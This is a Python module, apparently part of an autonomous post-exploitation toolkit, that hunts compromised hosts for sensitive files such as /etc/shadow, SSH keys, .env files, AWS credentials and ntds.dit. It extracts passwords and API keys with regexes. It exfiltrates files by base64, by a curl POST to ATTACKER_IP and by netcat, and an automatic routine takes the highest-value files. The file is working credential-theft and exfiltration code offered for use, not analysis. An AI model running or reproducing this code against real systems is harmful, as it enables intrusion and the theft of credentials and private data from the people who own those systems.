"""
Data Exfiltration System
Autonomous identification, collection, and extraction of sensitive data
"""

import os
import re
import base64
from typing import Dict, List, Optional
from session_store import Session, SessionStatus, get_session_store
from autonomous_session_manager import autonomous_session_manager

class DataExfiltration:
    """
    Handles autonomous data discovery and exfiltration from compromised systems.
    """
    
    def __init__(self):
        self.session_store = get_session_store()
        self.exfiltrated_data = {}  # session_id -> [list of exfiltrated files]
        self.discovered_files = {}  # session_id -> [list of sensitive files found]
        
        # Sensitive file patterns
        self.sensitive_patterns = {
            'credentials': [
                '*.key', '*.pem', '*.ppk', '*.p12', '*.pfx',
                '*password*', '*secret*', '*token*', '*credential*',
                '.env', '.env.*', 'config.php', 'wp-config.php',
                'web.config', 'appsettings.json', 'settings.py',
                '.ssh/id_rsa', '.ssh/id_dsa', '.aws/credentials',
                '.git-credentials', '.netrc', '.pgpass'
            ],
            'databases': [
                '*.sql', '*.db', '*.sqlite', '*.sqlite3', '*.mdb',
                '*.accdb', '*.dump', 'database.yml', '*.bak'
            ],
            'documents': [
                '*.pdf', '*.docx', '*.xlsx', '*.doc', '*.xls',
                '*.pptx', '*.txt', '*.odt', '*.ods'
            ],
            'code': [
                '.git/', '.svn/', '*.py', '*.java', '*.php',
                '*.js', '*.cpp', '*.c', '*.rb', '*.go'
            ],
            'system': [
                '/etc/passwd', '/etc/shadow', '/etc/sudoers',
                'SAM', 'SYSTEM', 'SECURITY', 'ntds.dit',
                '.bash_history', '.zsh_history', '.mysql_history'
            ]
        }
    
    def search_sensitive_data(self, session_id: str, file_types: List[str] = None, 
                             callback=None) -> List[Dict]:
        """
        Search for sensitive files on compromised system.
        
        Args:
            session_id: Session to search in
            file_types: List of file patterns (e.g., ['*.db', '*.key'])
            callback: Optional callback for updates
        
        Returns:
            List of discovered files with metadata
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return []
        
        if callback:
            callback({'message': f'🔍 Searching for sensitive data in session {session_id}...'})
        
        # Use all patterns if none specified
        if not file_types:
            file_types = []
            for category, patterns in self.sensitive_patterns.items():
                file_types.extend(patterns)
        
        discovered = []
        
        # Build find command
        find_patterns = []
        for pattern in file_types[:20]:  # Limit to prevent command too long
            if pattern.startswith('/'):
                # Absolute path
                find_patterns.append(f"-path '{pattern}'")
            elif '*' in pattern or '?' in pattern:
                # Wildcard pattern
                find_patterns.append(f"-name '{pattern}'")
            else:
                # Exact filename
                find_patterns.append(f"-name '{pattern}'")
        
        # Construct find command
        if find_patterns:
            find_cmd = f"find / -type f \\( {' -o '.join(find_patterns)} \\) 2>/dev/null | head -100"
        else:
            # Fallback: search common locations
            find_cmd = "find /home /var/www /opt /etc -type f -name '*password*' -o -name '*.key' -o -name '*.env' 2>/dev/null | head -50"
        
        # Execute search
        output = self._execute_in_session(session_id, find_cmd, callback)
        
        if output:
            files = output.strip().split('\n')
            
            for filepath in files:
                filepath = filepath.strip()
                if not filepath or len(filepath) < 2:
                    continue
                
                # Get file metadata
                metadata = self._get_file_metadata(session_id, filepath, callback)
                
                file_info = {
                    'path': filepath,
                    'size': metadata.get('size', 'unknown'),
                    'category': self._categorize_file(filepath),
                    'sensitivity': self._assess_sensitivity(filepath)
                }
                
                discovered.append(file_info)
        
        # Store discovered files
        if session_id not in self.discovered_files:
            self.discovered_files[session_id] = []
        
        self.discovered_files[session_id].extend(discovered)
        
        if callback and discovered:
            callback({'message': f'✅ Found {len(discovered)} sensitive files'})
            
            # Show high-priority files
            high_priority = [f for f in discovered if f['sensitivity'] in ['critical', 'high']]
            for file in high_priority[:5]:
                callback({'message': f'  🔴 {file["path"]} ({file["category"]}) - {file["sensitivity"]}'})
        
        return discovered
    
    def parse_credentials(self, session_id: str, files: List[str], callback=None) -> Dict:
        """
        Extract credentials from configuration files.
        
        Returns:
            Dictionary with extracted credentials
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return {}
        
        if callback:
            callback({'message': f'🔑 Parsing credentials from {len(files)} files...'})
        
        credentials = {
            'database': [],
            'api_keys': [],
            'passwords': [],
            'ssh_keys': [],
            'aws_keys': []
        }
        
        for filepath in files:
            # Read file content
            content = self._read_file(session_id, filepath, callback)
            
            if not content:
                continue
            
            # Parse based on file type
            if filepath.endswith('.env') or '.env.' in filepath:
                creds = self._parse_env_file(content)
                credentials['database'].extend(creds.get('database', []))
                credentials['api_keys'].extend(creds.get('api_keys', []))
            
            elif 'config.php' in filepath or 'wp-config.php' in filepath:
                creds = self._parse_php_config(content)
                credentials['database'].extend(creds.get('database', []))
            
            elif filepath.endswith('.json'):
                creds = self._parse_json_config(content)
                credentials['api_keys'].extend(creds.get('api_keys', []))
            
            elif 'id_rsa' in filepath or filepath.endswith('.pem'):
                credentials['ssh_keys'].append({
                    'path': filepath,
                    'content': content[:200] + '...' if len(content) > 200 else content
                })
            
            elif '.aws' in filepath or 'credentials' in filepath:
                creds = self._parse_aws_credentials(content)
                credentials['aws_keys'].extend(creds)
            
            # Generic password extraction
            passwords = self._extract_passwords(content)
            credentials['passwords'].extend(passwords)
        
        # Remove duplicates
        for key in credentials:
            if isinstance(credentials[key], list):
                credentials[key] = list({str(item): item for item in credentials[key]}.values())
        
        if callback:
            total = sum(len(v) for v in credentials.values() if isinstance(v, list))
            callback({'message': f'✅ Extracted {total} credentials'})
        
        return credentials
    
    def exfiltrate_data(self, session_id: str, file_path: str, method: str = 'base64', 
                       callback=None) -> Optional[str]:
        """
        Exfiltrate a file from compromised system.
        
        Args:
            session_id: Session to exfiltrate from
            file_path: Path to file on target
            method: 'base64', 'http_post', 'netcat', 'scp'
        
        Returns:
            Exfiltrated data or path to saved file
        """
        session = self.session_store.get_session(session_id)
        if not session or session.status != SessionStatus.ACTIVE:
            return None
        
        if callback:
            callback({'message': f'📤 Exfiltrating {file_path} using {method}...'})
        
        if method == 'base64':
            # Read file and base64 encode
            cmd = f"cat '{file_path}' | base64 -w 0 2>/dev/null || base64 '{file_path}'"
            output = self._execute_in_session(session_id, cmd, callback)
            
            if output:
                try:
                    # Decode base64
                    data = base64.b64decode(output.strip())
                    
                    # Save locally
                    filename = os.path.basename(file_path)
                    save_path = f"/tmp/exfil_{session_id}_{filename}"
                    
                    with open(save_path, 'wb') as f:
                        f.write(data)
                    
                    # Track exfiltrated data
                    if session_id not in self.exfiltrated_data:
                        self.exfiltrated_data[session_id] = []
                    
                    self.exfiltrated_data[session_id].append({
                        'source_path': file_path,
                        'local_path': save_path,
                        'size': len(data),
                        'method': method
                    })
                    
                    if callback:
                        callback({'message': f'✅ Exfiltrated {len(data)} bytes to {save_path}'})
                    
                    return save_path
                    
                except Exception as e:
                    if callback:
                        callback({'message': f'❌ Exfiltration failed: {e}'})
        
        elif method == 'http_post':
            # Post data to attacker-controlled server
            # This would require a listener on the attacking machine
            cmd = f"curl -X POST -d @'{file_path}' http://ATTACKER_IP:8000/upload 2>/dev/null"
            output = self._execute_in_session(session_id, cmd, callback)
            
            if callback:
                callback({'message': f'📡 Data posted to HTTP server'})
        
        elif method == 'netcat':
            # Send via netcat
            cmd = f"nc ATTACKER_IP 9999 < '{file_path}'"
            output = self._execute_in_session(session_id, cmd, callback)
            
            if callback:
                callback({'message': f'📡 Data sent via netcat'})
        
        return None
    
    def auto_exfiltrate_high_value(self, session_id: str, callback=None) -> List[str]:
        """
        Automatically identify and exfiltrate high-value targets.
        
        Returns:
            List of exfiltrated file paths
        """
        if callback:
            callback({'message': f'🎯 Auto-exfiltrating high-value data...'})
        
        # Search for high-value targets
        high_value_patterns = [
            '/etc/passwd', '/etc/shadow',
            '*.key', '*.pem', '.env', 'wp-config.php',
            '*.sql', '*.db', '.ssh/id_rsa'
        ]
        
        discovered = self.search_sensitive_data(session_id, high_value_patterns, callback)
        
        # Filter for critical/high severity
        high_value = [f for f in discovered if f['sensitivity'] in ['critical', 'high']]
        
        exfiltrated = []
        
        # Exfiltrate top 10 files
        for file_info in high_value[:10]:
            local_path = self.exfiltrate_data(session_id, file_info['path'], 'base64', callback)
            
            if local_path:
                exfiltrated.append(local_path)
        
        if callback:
            callback({'message': f'✅ Auto-exfiltrated {len(exfiltrated)} high-value files'})
        
        return exfiltrated
    
    def _execute_in_session(self, session_id: str, command: str, callback=None) -> str:
        """Execute command in session."""
        return autonomous_session_manager._run_command(session_id, command, callback)
    
    def _get_file_metadata(self, session_id: str, filepath: str, callback=None) -> Dict:
        """Get file metadata (size, permissions, etc.)."""
        cmd = f"ls -lh '{filepath}' 2>/dev/null"
        output = self._execute_in_session(session_id, cmd, callback)
        
        metadata = {}
        
        if output:
            # Parse ls output
            # Format: -rw-r--r-- 1 user group 1.2K Jan 1 12:00 file.txt
            parts = output.split()
            if len(parts) >= 5:
                metadata['permissions'] = parts[0]
                metadata['size'] = parts[4]
        
        return metadata
    
    def _read_file(self, session_id: str, filepath: str, callback=None, max_size: int = 10000) -> str:
        """Read file content (limited size for safety)."""
        cmd = f"head -c {max_size} '{filepath}' 2>/dev/null"
        return self._execute_in_session(session_id, cmd, callback)
    
    def _categorize_file(self, filepath: str) -> str:
        """Categorize file based on path/extension."""
        filepath_lower = filepath.lower()
        
        for category, patterns in self.sensitive_patterns.items():
            for pattern in patterns:
                pattern_clean = pattern.replace('*', '').replace('/', '')
                if pattern_clean in filepath_lower:
                    return category
        
        return 'other'
    
    def _assess_sensitivity(self, filepath: str) -> str:
        """Assess sensitivity level of a file."""
        filepath_lower = filepath.lower()
        
        critical_keywords = ['shadow', 'passwd', 'id_rsa', 'id_dsa', '.pem', '.key', 
                            'ntds.dit', 'sam', 'system', 'secret', 'private']
        
        high_keywords = ['.env', 'config', 'database', '.sql', 'credential', 
                        'password', 'token', 'api_key']
        
        medium_keywords = ['.db', 'backup', '.bak', '.dump']
        
        for keyword in critical_keywords:
            if keyword in filepath_lower:
                return 'critical'
        
        for keyword in high_keywords:
            if keyword in filepath_lower:
                return 'high'
        
        for keyword in medium_keywords:
            if keyword in filepath_lower:
                return 'medium'
        
        return 'low'
    
    def _parse_env_file(self, content: str) -> Dict:
        """Parse .env file for credentials."""
        creds = {'database': [], 'api_keys': []}
        
        # Database credentials
        db_patterns = [
            r'DB_HOST\s*=\s*([^\s]+)',
            r'DB_USERNAME\s*=\s*([^\s]+)',
            r'DB_PASSWORD\s*=\s*([^\s]+)',
            r'DB_DATABASE\s*=\s*([^\s]+)',
            r'DATABASE_URL\s*=\s*([^\s]+)'
        ]
        
        db_cred = {}
        for pattern in db_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                key = pattern.split('\\')[0].replace('DB_', '').lower()
                db_cred[key] = match.group(1).strip('"\'')
        
        if db_cred:
            creds['database'].append(db_cred)
        
        # API keys
        api_patterns = [
            r'API_KEY\s*=\s*([^\s]+)',
            r'SECRET_KEY\s*=\s*([^\s]+)',
            r'AWS_ACCESS_KEY\s*=\s*([^\s]+)',
            r'AWS_SECRET\s*=\s*([^\s]+)'
        ]
        
        for pattern in api_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                key_name = pattern.split('\\')[0]
                creds['api_keys'].append({
                    'type': key_name,
                    'value': match.group(1).strip('"\'')
                })
        
        return creds
    
    def _parse_php_config(self, content: str) -> Dict:
        """Parse PHP config files."""
        creds = {'database': []}
        
        # WordPress config pattern
        patterns = {
            'host': r"DB_HOST['\"],\s*['\"]([^'\"]+)",
            'username': r"DB_USER['\"],\s*['\"]([^'\"]+)",
            'password': r"DB_PASSWORD['\"],\s*['\"]([^'\"]+)",
            'database': r"DB_NAME['\"],\s*['\"]([^'\"]+)"
        }
        
        db_cred = {}
        for key, pattern in patterns.items():
            match = re.search(pattern, content)
            if match:
                db_cred[key] = match.group(1)
        
        if db_cred:
            creds['database'].append(db_cred)
        
        return creds
    
    def _parse_json_config(self, content: str) -> Dict:
        """Parse JSON config files."""
        import json
        creds = {'api_keys': []}
        
        try:
            data = json.loads(content)
            
            # Recursively search for keys
            def find_keys(obj, path=''):
                if isinstance(obj, dict):
                    for key, value in obj.items():
                        key_lower = key.lower()
                        if any(keyword in key_lower for keyword in ['key', 'token', 'secret', 'password']):
                            creds['api_keys'].append({
                                'type': key,
                                'value': str(value),
                                'path': path
                            })
                        find_keys(value, f"{path}.{key}")
                elif isinstance(obj, list):
                    for i, item in enumerate(obj):
                        find_keys(item, f"{path}[{i}]")
            
            find_keys(data)
        except:
            pass
        
        return creds
    
    def _parse_aws_credentials(self, content: str) -> List[Dict]:
        """Parse AWS credentials file."""
        creds = []
        
        access_key_pattern = r'aws_access_key_id\s*=\s*([^\s]+)'
        secret_key_pattern = r'aws_secret_access_key\s*=\s*([^\s]+)'
        
        access_match = re.search(access_key_pattern, content, re.IGNORECASE)
        secret_match = re.search(secret_key_pattern, content, re.IGNORECASE)
        
        if access_match and secret_match:
            creds.append({
                'type': 'AWS',
                'access_key': access_match.group(1),
                'secret_key': secret_match.group(1)
            })
        
        return creds
    
    def _extract_passwords(self, content: str) -> List[Dict]:
        """Generic password extraction."""
        passwords = []
        
        # Common password patterns
        patterns = [
            r'password[\'"\s:=]+([^\s\'"]+)',
            r'passwd[\'"\s:=]+([^\s\'"]+)',
            r'pwd[\'"\s:=]+([^\s\'"]+)'
        ]
        
        for pattern in patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                password = match.group(1).strip('"\';,')
                if len(password) > 3:  # Filter noise
                    passwords.append({
                        'type': 'password',
                        'value': password
                    })
        
        return passwords[:10]  # Limit results
    
    def get_exfiltration_summary(self) -> Dict:
        """Get summary of exfiltrated data."""
        summary = {
            'total_files': 0,
            'total_size': 0,
            'by_session': {},
            'by_category': {}
        }
        
        for session_id, files in self.exfiltrated_data.items():
            summary['total_files'] += len(files)
            summary['by_session'][session_id] = len(files)
            
            for file_info in files:
                summary['total_size'] += file_info.get('size', 0)
        
        return summary

# Singleton instance
data_exfiltration = DataExfiltration()
